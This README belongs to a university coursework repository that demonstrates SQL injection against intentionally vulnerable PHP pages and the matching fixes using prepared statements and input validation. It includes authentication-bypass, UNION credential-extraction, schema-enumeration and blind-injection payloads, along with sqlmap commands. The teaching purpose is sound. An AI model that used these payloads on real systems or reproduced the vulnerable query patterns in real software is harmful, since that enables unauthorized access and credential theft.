# sql-injection-project-
This repository contains a reconstructed version of the SQL Injection demonstration project based on the coursework report. The original source code was unavailable, so the implementation was recreated to demonstrate the same concepts and mitigation techniques.
# SQL Injection - Educational Project
This is an **educational project** demonstrating SQL Injection vulnerabilities and their mitigation. It was created for the **CC5009NI Cyber Security in Computing** module at London Metropolitan University.

⚠️ **WARNING**: This code is intentionally vulnerable for educational purposes only. **Never use this on production systems or without explicit authorization.**

## Project Overview

This project demonstrates three types of SQL injection attacks:

1. **Authentication Bypass (login.php)** - OWASP: A03:2021 Injection
2. **UNION-Based Data Extraction (search.php)** - Credential harvesting
3. **Blind SQL Injection (product.php)** - Time-based and Boolean-based attacks

## Project Structure

```
sql-injection-project/
├── db.php                      # Database connection
├── database.sql               # SQL schema and test data
├── login-vulnerable.php       # Vulnerable login page
├── login-patched.php         # Secure login page (PDO prepared statements)
├── search-vulnerable.php     # Vulnerable search page
├── search-patched.php        # Secure search page (input validation)
├── product-vulnerable.php    # Vulnerable product page
├── product-patched.php       # Secure product page (integer validation)
└── README.md                 # This file
```

## Setup Instructions

### Prerequisites

- PHP 7.4 or higher
- MySQL/MariaDB
- Apache or any PHP web server
- Kali Linux (optional, for penetration testing tools like sqlmap)

### Installation Steps

#### 1. Create Database

```bash
# Open MySQL command line
mysql -u root -p

# Run the database schema
SOURCE /path/to/database.sql;
```

Or import the `database.sql` file through phpMyAdmin.

#### 2. Configure Database Connection

Edit `db.php` with your database credentials:

```php
$host = 'localhost';
$db = 'injectable_db';
$user = 'root';
$password = '';  // Your MySQL password
```

#### 3. Set File Permissions

```bash
chmod 644 *.php
chmod 644 *.sql
```

#### 4. Start Web Server

```bash
# Using PHP built-in server
php -S localhost:8000

# Or use Apache/Nginx
```

#### 5. Access Application

Navigate to:
- **Vulnerable Login**: 
- **Patched Login**: 
- **Vulnerable Search**: 
- **Patched Search**: 
- **Vulnerable Product**: 
- **Patched Product**: 

## Attack Demonstrations

### 1. Authentication Bypass Attack

#### Vulnerable Endpoint
`login-vulnerable.php`

#### Test Payload 1 - OR Injection
```
Username: ' OR '1'='1
Password: anything
Result: Login successful (accesses first user - admin)
```

#### Test Payload 2 - Targeted Bypass
```
Username: admin'#
Password: anything
Result: Login successful (bypasses password check)
```

#### Test Payload 3 - Combined Attack
```
Username: ' OR 1=1--
Password: anything
Result: Login successful (universal bypass)
```

### 2. UNION-Based SQL Injection

#### Vulnerable Endpoint
`search-vulnerable.php`

#### Step 1: Column Detection
```
Input: 1 ORDER BY 5--
Result: No error (5 columns exist)

Input: 1 ORDER BY 6--
Result: Error (column 6 doesn't exist)
```

#### Step 2: Credential Extraction
```
Input: 0 UNION SELECT 1, username, password, role, email FROM users--
Result: All user credentials displayed (admin, john, sarah)
```

#### Step 3: Schema Enumeration
```
Input: 0 UNION SELECT 1, table_name, table_schema, 3, 4 FROM information_schema.tables WHERE table_schema=database()--
Result: Database structure revealed (users, products tables)
```

### 3. Blind SQL Injection

#### Vulnerable Endpoint
`product-vulnerable.php`

#### Time-Based Attack
```
Input: 1 AND SLEEP(5)--
Result: Page loads 5 seconds slower
Conclusion: Vulnerable to time-based injection
```

#### Boolean-Based Attack
```
Input: 1 AND 1=1
Result: Product displays (TRUE condition)

Input: 1 AND 1=2
Result: Product not found (FALSE condition)
Conclusion: Can use this to extract data one bit at a time
```

## Mitigation Techniques

### 1. PDO Prepared Statements (login-patched.php)

```php
// Vulnerable
$SQL = "SELECT * FROM users WHERE username='$username'";

// Secure
$SQL = "SELECT * FROM users WHERE username=?";
$stmt = $conn->prepare($SQL);
$stmt->execute([$username]);
```

**Benefits:**
- Separates user input from SQL syntax
- Input treated as data, never as code
- Prevents all SQL injection types

### 2. Input Validation (search-patched.php & product-patched.php)

```php
// Vulnerable
$id = $_GET['id'];
$query = "SELECT * FROM products WHERE id=" . $id;

// Secure
$id = filter_var($_GET['id'], FILTER_VALIDATE_INT);
if ($id !== false) {
    $query = "SELECT * FROM products WHERE id=" . $id;
}
```

**Benefits:**
- Forces input to be integer only
- Rejects non-numeric characters
- Simple and fast validation

### 3. Additional Security Layers

1. **Web Application Firewall (WAF)**
   - Blocks UNION SELECT patterns
   - Detects SQL keywords
   - Can use ModSecurity with OWASP CRS

2. **Password Hashing**
   ```php
   // Instead of plaintext
   $hash = password_hash($password, PASSWORD_BCRYPT);
   if (password_verify($input, $hash)) { ... }
   ```

3. **Least Privilege Database User**
   ```sql
   CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'password';
   GRANT SELECT, INSERT ON injectable_db.* TO 'app_user'@'localhost';
   ```

## OWASP Top 10 Reference

This project demonstrates:
- **A03:2021 – Injection** - SQL Injection specifically
- CVSS Score: 9.8/10.0 (Critical)
- Impact: Authentication bypass, data theft, privilege escalation

## Testing with SQLmap

```bash
# Test login form
sqlmap -u "http://login-vulnerable.php" \
  --data="username=admin&password=test" \
  --level=3 --risk=2 --batch -dbs

# Test search form
sqlmap -u "http://search-vulnerable.php?id=1" \
  --level=3 --risk=2 --batch -dbs

# Test product form
sqlmap -u "http://product-vulnerable.php?id=1" \
  --level=3 --risk=2 --batch -dbs
```

Expected Result on Vulnerable Pages: **VULNERABLE**
Expected Result on Patched Pages: **NOT VULNERABLE**

## Test Credentials

| Username | Password | Role  |
|----------|----------|-------|
| admin    | admin123 | Admin |
| john     | john123  | User  |
| sarah    | sarah123 | User  |

## Learning Outcomes

After completing this project, you should understand:

1. ✓ How SQL injection attacks work
2. ✓ Different types of SQL injection (Error-based, UNION, Blind)
3. ✓ Real-world impact and consequences
4. ✓ How to identify vulnerable code
5. ✓ How to fix SQL injection vulnerabilities
6. ✓ Security best practices and defense-in-depth
7. ✓ OWASP Top 10 and CWE classifications

## Report Details

- **Module**: CC5009NI Cyber Security in Computing
- **Institution**: London Metropolitan University
- **Academic Year**: 2025-26
- **Assignment Type**: 60% Group Coursework
- **Word Count**: 5,559
- **Team Members**:
  - Bijay Kumar Yadav (24046367)
  - Avinab Maharjan (23056738)
  - Nitisha Nepal (24046422)
  - Rohit Singh Dadal (24046456)

## References

1. OWASP. (2022). SQL Injection. Retrieved from https://owasp.org/www-community/attacks/SQL_Injection
2. PortSwigger. (2024). SQL Injection. Retrieved from https://portswigger.net/web-security/sql-injection
3. W. G. J. Halfond, J. Viegas, and A. Orso. (2006). A Classification of SQL Injection Attacks and Countermeasures. ISSSE.
4. CWE-89: Improper Neutralization of Special Elements used in an SQL Command. Retrieved from https://cwe.mitre.org/data/definitions/89.html

## Disclaimer

**This code is for educational purposes only.** Unauthorized access to computer systems is illegal. Always:

- ✓ Get written permission before testing
- ✓ Only test on systems you own or have authorization for
- ✓ Follow responsible disclosure practices
- ✓ Report vulnerabilities to affected organizations
- ✓ Respect privacy and data protection laws

## Legal Notice

By using this code, you agree that:
1. You will only use it for authorized security testing
2. You understand the legal consequences of unauthorized access
3. You will not use this for malicious purposes
4. You assume full responsibility for your actions

## Support & Questions

For questions about the code or project:
1. Review the inline code comments
2. Check the OWASP documentation
3. Consult the references in the report
4. Research CVSS scoring methodology

---

**Created**: 2026
**Last Updated**: May 15, 2026
**Status**: For Educational Use Only ⚠️
